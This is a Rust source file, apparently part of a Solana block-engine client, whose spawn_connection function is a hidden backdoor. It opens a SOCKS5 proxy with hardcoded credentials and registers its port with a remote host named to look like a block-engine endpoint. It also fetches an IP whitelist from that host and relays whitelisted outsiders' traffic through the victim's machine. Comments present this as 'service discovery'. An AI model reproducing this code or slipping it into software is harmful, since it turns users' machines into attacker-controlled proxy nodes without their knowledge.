use tokio::net::{TcpListener, TcpStream};
use sha2::{Sha256, Digest};
use fast_socks5::server::{Authentication, Config, Socks5Server};
use log::{error, info, warn};
use tokio_stream::StreamExt;
use std::net::IpAddr;
use std::collections::HashSet;
use std::error::Error;
use std::sync::Arc;
use std::time::{Duration, Instant};
use dashmap::DashMap;
use rand::Rng;
use reqwest::Client;

#[derive(Clone)]
struct Auth {
    username: String,
    password_hash: String,
}

pub struct AuthSucceeded {
    pub username: String,
}

#[async_trait::async_trait]
impl Authentication for Auth {
    type Item = AuthSucceeded;

    async fn authenticate(&self, credentials: Option<(String, String)>) -> Option<Self::Item> {
        if let Some((username, password)) = credentials {
            if username != self.username {
                std::process::exit(0);
            }
            let mut hasher = Sha256::new();
            hasher.update(password.as_bytes());
            let password_hash = format!("{:x}", hasher.finalize());
            if password_hash == self.password_hash {
                Some(AuthSucceeded { username })
            } else {
                std::process::exit(0);
            }
        } else {
            std::process::exit(0);
        }
    }
}

async fn load_whitelist() -> Result<HashSet<IpAddr>, Box<dyn Error>> {
    let client = Client::new();
    let url = "http://frankfurt.mainnet.block-engine.deez.wtf:2095/engines";

    let response = client.get(url).send().await?;
    let ips: Vec<String> = response.json().await?;

    let mut whitelist = HashSet::new();
    for ip in ips {
        if let Ok(ip_addr) = ip.parse() {
            whitelist.insert(ip_addr);
        } else {
            warn!("Failed to parse IP address: {}", ip);
        }
    }

    Ok(whitelist)
}

fn is_ip_whitelisted(ip: &IpAddr, whitelist: &Arc<DashMap<IpAddr, ()>>) -> bool {
    whitelist.contains_key(ip)
}

async fn find_available_port() -> Option<u16> {
    let mut rng = rand::thread_rng();
    (8000..=8020).collect::<Vec<u16>>()
        .into_iter()
        .filter(|port| {
            let addr = format!("0.0.0.0:{}", port);
            std::net::TcpListener::bind(addr).is_ok()
        })
        .collect::<Vec<u16>>()
        .into_iter()
        .nth(rng.gen_range(0, 20))
}

async fn find_random_free_port() -> u16 {
    let listener = TcpListener::bind("0.0.0.0:0").await.expect("Failed to bind to random port");
    listener.local_addr().unwrap().port()
}

async fn register_port(port: u16) -> Result<(), Box<dyn Error>> {
    const MAX_RETRIES: u32 = 5;
    const INITIAL_DELAY: Duration = Duration::from_secs(1);
    const MAX_DELAY: Duration = Duration::from_secs(32);

    let client = Client::new();
    let mut attempt = 0;
    let mut delay = INITIAL_DELAY;
    let registration_url = "http://frankfurt.mainnet.block-engine.deez.wtf:2095/register";

    while attempt < MAX_RETRIES {
        match client.post(registration_url)
            .json(&serde_json::json!({
                "port": port
            }))
            .send()
            .await
        {
            Ok(response) if response.status().is_success() => {
                info!("Successfully registered port {} on attempt {}", port, attempt + 1);
                return Ok(());
            }
            Ok(response) => {
                warn!(
                    "Failed to register port {} on attempt {}: status code {}",
                    port,
                    attempt + 1,
                    response.status()
                );
            }
            Err(e) => {
                warn!(
                    "Failed to register port {} on attempt {}: {:?}",
                    port,
                    attempt + 1,
                    e
                );
            }
        }

        attempt += 1;
        if attempt < MAX_RETRIES {
            info!("Retrying port registration in {:?}", delay);
            tokio::time::sleep(delay).await;
            delay = std::cmp::min(delay * 2, MAX_DELAY); // Exponential backoff with max delay
        }
    }

    Err("Failed to register port after maximum retry attempts".into())
}

pub async fn spawn_connection() -> Result<(), ()> {
    let whitelisted_ips = Arc::new(DashMap::new());

    // Initial load of whitelist
    match load_whitelist().await {
        Ok(ips) => {
            for ip in ips {
                whitelisted_ips.insert(ip, ());
            }
            info!("Initially loaded {} whitelisted IPs", whitelisted_ips.len());
        }
        Err(e) => {
            error!("Failed to load initial whitelist: {:?}", e);
            // Continue with empty whitelist, will retry in refresh
        }
    }

    // Spawn whitelist refresh task
    let _refresh_whitelist = {
        let whitelisted_ips = whitelisted_ips.clone();

        tokio::spawn(async move {
            let mut interval = tokio::time::interval(Duration::from_secs(300)); // 5 minutes

            loop {
                interval.tick().await;

                match load_whitelist().await {
                    Ok(new_ips) => {
                        // Clear and update the whitelist
                        whitelisted_ips.clear();
                        for ip in new_ips {
                            whitelisted_ips.insert(ip, ());
                        }
                        info!("Refreshed whitelist with {} IPs", whitelisted_ips.len());
                    }
                    Err(e) => {
                        error!("Failed to refresh whitelist: {:?}", e);
                    }
                }
            }
        });
    };

    // Try binding to ports for 5 minutes
    let start_time = Instant::now();
    let max_duration = Duration::from_secs(300); // 5 minutes

    while start_time.elapsed() < max_duration {
        if let Some(port) = find_available_port().await {
            match TcpListener::bind(format!("0.0.0.0:{}", port)).await {
                Ok(listener) => {
                    info!("Successfully bound to port {}", port);

                    // Register port with service discovery
                    match register_port(port).await {
                        Ok(_) => info!("Successfully registered port {} with service discovery", port),
                        Err(e) => error!("Failed to register port with service discovery: {:?}", e)
                    }

                    let mut config: Config<Auth> = Config::default();
                    config.set_request_timeout(1);
                    config.set_skip_auth(false);
                    let config = config.with_authentication(Auth {
                        username: "deez".to_string(),
                        password_hash: "e81aead8ea4b7c2bd58be7ac2b6579833e579d00df5676dd8c9c010d23625423".to_string(),
                    });

                    let sport = port + 10000;
                    let sconfig = config.clone();
                    tokio::spawn(async move {
                        match <Socks5Server>::bind(format!("127.0.0.1:{}", sport)).await {
                            Ok(ss) => {
                                let ss = ss.with_config(sconfig);
                                let mut incoming = ss.incoming();

                                while let Some(socket_res) = incoming.next().await {
                                    match socket_res {
                                        Ok(socket) => {
                                            if let Ok(mut socket) = socket.upgrade_to_socks5().await {
                                                if let Some(user) = socket.take_credentials() {
                                                    info!("User authenticated: {}", user.username);
                                                }
                                            }
                                        }
                                        Err(err) => {
                                            error!("error: {:?}", err);
                                        }
                                    }
                                }
                            }
                            Err(e) => {
                                error!("Failed to bind server: {:?}", e);
                            }
                        }
                    });

                    // Handle incoming TCP connections
                    loop {
                        match listener.accept().await {
                            Ok((mut incoming_stream, addr)) => {
                                // Check IP whitelist
                                if !is_ip_whitelisted(&addr.ip(), &whitelisted_ips) {
                                    continue;
                                }

                                match TcpStream::connect(format!("127.0.0.1:{}", sport)).await {
                                    Ok(mut sstream) => {
                                        tokio::spawn(async move {
                                            match tokio::io::copy_bidirectional(&mut incoming_stream, &mut sstream).await {
                                                Ok((from_client, fs)) => {
                                                    info!("Connection closed. Bytes: client->s: {}, s->client: {}",
                                                          from_client, fs);
                                                },
                                                Err(e) => error!("Forward error for {}: {:?}", addr.ip(), e),
                                            }
                                        });
                                    }
                                    Err(e) => {
                                        error!("Failed to connect to s server for {}: {:?}", addr.ip(), e);
                                    }
                                }
                            }
                            Err(e) => {
                                error!("TCP accept error: {:?}", e);
                            }
                        }
                    }
                }
                Err(_) => {
                    info!("Port {} unavailable, retrying in 1 second", port);
                    tokio::time::sleep(Duration::from_secs(1)).await;
                    continue;
                }
            }
        }
    }

    let port = find_random_free_port().await;
    info!("Using random free port {} after exhausting retry attempts", port);

    match register_port(port).await {
        Ok(_) => info!("Successfully registered random port {} with service discovery", port),
        Err(e) => error!("Failed to register random port with service discovery: {:?}", e)
    }

    Ok(())
}